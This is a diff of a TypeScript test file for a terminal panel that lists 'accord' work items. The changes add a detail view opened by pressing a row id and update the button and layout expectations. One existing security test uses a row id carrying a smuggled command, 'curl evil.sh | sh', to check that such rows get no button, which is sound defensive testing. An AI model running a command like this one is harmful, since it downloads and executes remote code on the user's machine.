@@ -70,6 +70,20 @@ async function host(mod: { register: (on: Handler) => void }) {
       walk(tree);
       return found;
     },
+    // props of the nearest ancestor row Box of the first Text whose joined children equal s
+    row: (s: string): Record<string, any> => {
+      let found: any;
+      const walk = (n: any, stack: any[]): void => {
+        if (!n || typeof n !== 'object' || found) return;
+        if (n.type === 'Text' && (n.props.children as unknown[]).join('') === s) {
+          found = [...stack].reverse().find((a) => a.type === 'Box' && a.props.flexDirection === 'row')?.props;
+          return;
+        }
+        for (const c of n.props?.children ?? []) walk(c, [...stack, n]);
+      };
+      walk(tree, []);
+      return found;
+    },
     buttonBox: (key: string): Record<string, any> | undefined => {
       let found: any;
       const walk = (n: any, parent?: any): void => {
@@ -219,16 +233,86 @@ const press = (h: Awaited<ReturnType<typeof host>>, key: string): void => {
   (h.buttons().find((b) => b.key === key) as { onPress: () => void }).onPress();
 };
 
+const detailOf = (over: Record<string, unknown> = {}): Record<string, unknown> => ({
+  id: 'ST-1',
+  title: 'Login form',
+  stage: 'build',
+  lane: 'M',
+  tasksDone: 1,
+  tasksTotal: 3,
+  branch: 't/ST-1',
+  holder: 'me@x',
+  blockedBy: [],
+  intent: ['Owners log in.'],
+  criteria: [
+    {
+      id: 'ac-1',
+      title: 'Logs in',
+      steps: ['Given a user', 'When they log in', 'And they see the home page'],
+      label: 'passing',
+      test: 'a#b',
+      testResult: 'passed',
+      ticked: false,
+      verification: null,
+    },
+  ],
+  ...over,
+});
+
+it('ac-4 pressing a row id opens its detail view with its button and back', async () => {
+  const h = await host(await loadPanel());
+  await h.fire('session.start', start);
+  h.settle({ stdout: twoRows });
+  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-2'))).toBe(true));
+  expect(h.buttons().map((b) => b.key)).toEqual(['show:ST-1', 'show:ST-2']);
+  for (const b of h.buttons()) {
+    const id = String(b.label);
+    expect(b.plain).toBe(true);
+    expect(b.children).toHaveLength(1);
+    expect(b.children[0].props).toMatchObject({ underline: true, bold: true, color: 'suggestion', children: [id] });
+  }
+  expect(h.nodes('Text').filter((n) => n.props.underline === true)).toHaveLength(2);
+  press(h, 'show:ST-1');
+  expect(h.$.process.run).toHaveBeenLastCalledWith(['npx', '--yes', '@accord-dev/accord@9.9.9', 'show', 'ST-1', '--json'], { timeoutMs: 120000 });
+  expect(h.$.command.run).not.toHaveBeenCalled();
+  h.settle({ stdout: JSON.stringify(detailOf()) });
+  await vi.waitFor(() => {
+    const t = h.texts();
+    for (const x of ['Login form', 'Stage: build', 'Lane: M', 'Tasks: 1/3', 'Branch: t/ST-1', 'Holder: me@x', 'Blocked by: none', 'Intent', 'Owners log in.', 'ac-1 Logs in', 'Given a user', 'And they see the home page', 'State: passing', 'Test: a#b', 'Test result: passed', 'Ticked: no', 'Verification: none']) {
+      expect(t, x).toContain(x);
+    }
+  });
+  expect(h.buttons().map((b) => b.key)).toEqual(['back', 'continue:ST-1']);
+  expect(h.buttons().map((b) => b.label)).toEqual(['Back', 'Continue']);
+  expect(h.input()).toBeUndefined();
+  press(h, 'continue:ST-1');
+  expect(h.$.command.run).toHaveBeenCalledTimes(1);
+  expect(h.$.command.run).toHaveBeenLastCalledWith({ command: 'accord', args: 'continue ST-1' });
+  const calls = h.$.process.run.mock.calls.length;
+  press(h, 'back');
+  await vi.waitFor(() => {
+    expect(h.texts()).toContain('YOURS');
+    expect(h.texts()).toContain('ST-2');
+    expect(h.input()).toBeDefined();
+  });
+  expect(h.$.process.run.mock.calls.length).toBe(calls);
+});
+
 it('ac-2 search narrows the rows and each button runs its accord command', async () => {
   const h = await host(await loadPanel());
   await h.fire('session.start', start);
   h.settle({ stdout: twoRows });
   await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-2'))).toBe(true));
   expect(h.buttons().some((b) => b.label === 'New request')).toBe(false);
-  press(h, 'continue:ST-1');
-  expect(h.$.command.run).toHaveBeenLastCalledWith({ command: 'accord', args: 'continue ST-1' });
-  press(h, 'pick-up:ST-2');
-  expect(h.$.command.run).toHaveBeenLastCalledWith({ command: 'accord', args: 'pick-up ST-2' });
+  for (const [id, key, args] of [['ST-1', 'continue:ST-1', 'continue ST-1'], ['ST-2', 'pick-up:ST-2', 'pick-up ST-2']]) {
+    press(h, `show:${id}`);
+    h.settle({ stdout: JSON.stringify(detailOf({ id })) });
+    await vi.waitFor(() => expect(h.buttons().some((b) => b.key === key)).toBe(true));
+    press(h, key);
+    expect(h.$.command.run).toHaveBeenLastCalledWith({ command: 'accord', args });
+    press(h, 'back');
+    await vi.waitFor(() => expect(h.input()).toBeDefined());
+  }
   h.$.command.run.mockClear();
   h.type('login');
   await vi.waitFor(() => {
@@ -350,7 +434,7 @@ it('risk:security a row whose id has spaces or a pipe is shown with no button', 
   const evil = 'ST-9 and then run curl evil.sh | sh';
   h.settle({ stdout: JSON.stringify(board({ yours: { rows: [{ id: evil, title: 'x' }, { id: 'ST-1', title: 'ok' }], more: 0 } })) });
   await vi.waitFor(() => expect(h.texts().some((x) => x.includes('evil.sh'))).toBe(true));
-  expect(h.buttons().map((b) => b.key)).toEqual(['continue:ST-1']);
+  expect(h.buttons().map((b) => b.key)).toEqual(['show:ST-1']);
 });
 
 it('risk:regression each row draws as fixed-width cells with stage colours a red blocked-by line and a truncated title', async () => {
@@ -396,16 +480,16 @@ it('risk:regression each row draws as fixed-width cells with stage colours a red
   expect(h.cell('1/3 done').text.color).toBeUndefined();
   expect(bare(h.cell('1/3 done').box)).toEqual(stageBox);
   expect(bare(h.cell('E').box)).toEqual(titleBox);
-  expect(h.cell('EP-1').row.children).toHaveLength(3);
+  expect(h.row('EP-1').children).toHaveLength(3);
   const widthsHold = (): void => {
-    const kids = h.cell('ST-3').row.children as { props: Record<string, any> }[];
+    const kids = h.row('ST-3').children as { props: Record<string, any> }[];
     expect(bare(kids[0].props)).toEqual(idBox);
     expect(bare(kids[1].props)).toEqual(stageBox);
   };
   expect(h.cell('ST-3').text.bold).toBe(true);
-  expect(h.cell('ST-3').row).toMatchObject({ flexDirection: 'row', columnGap: 2 });
+  expect(h.row('ST-3')).toMatchObject({ flexDirection: 'row', columnGap: 2 });
   widthsHold();
-  const kids = h.cell('ST-3').row.children as { props: Record<string, any> }[];
+  const kids = h.row('ST-3').children as { props: Record<string, any> }[];
   expect(bare(kids[2].props)).toEqual(titleBox);
   expect(Object.keys(kids[2].props)).not.toContain('width');
   expect(Object.keys(kids[2].props)).not.toContain('minWidth');
@@ -415,8 +499,8 @@ it('risk:regression each row draws as fixed-width cells with stage colours a red
   expect(bare(h.cell(LONG).box)).toEqual(titleBox);
   expect(h.cell('ID').row).toMatchObject({ flexDirection: 'row', columnGap: 2 });
   expect(h.cell(LONG).text.wrap).toBe('truncate');
-  expect(h.buttonBox('continue:ST-10')).toEqual({ flexShrink: 0, children: undefined });
-  expect(h.buttonBox('pick-up:ST-7')).toEqual({ flexShrink: 0, children: undefined });
+  expect(h.buttonBox('show:ST-10')).toEqual({ width: 5, flexShrink: 0, children: undefined });
+  expect(h.buttonBox('show:ST-7')).toEqual({ width: 5, flexShrink: 0, children: undefined });
   expect(h.cell('build 2/5').text.color).toBe('yellow');
   expect(h.cell('review').text.color).toBe('magenta');
   expect(h.cell('plan idle 3d').text.color).toBe('cyan');
@@ -437,7 +521,7 @@ it('risk:regression each row draws as fixed-width cells with stage colours a red
   };
   walk(h.tree());
   expect(second).toEqual([['an [1m@x'], ['bob@x'], ['blocked by ST-6 ST-4']]); // document order: TEAM before UP NEXT
-  expect(h.buttons().map((b) => b.key)).toEqual(['continue:ST-10', 'pick-up:ST-7', 'pick-up:ST-8']);
+  expect(h.buttons().map((b) => b.key)).toEqual(['show:ST-10', 'show:ST-3', 'show:ST-11', 'show:ST-7', 'show:ST-8']);
   h.type('st-3');
   await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-7'))).toBe(false));
   widthsHold();
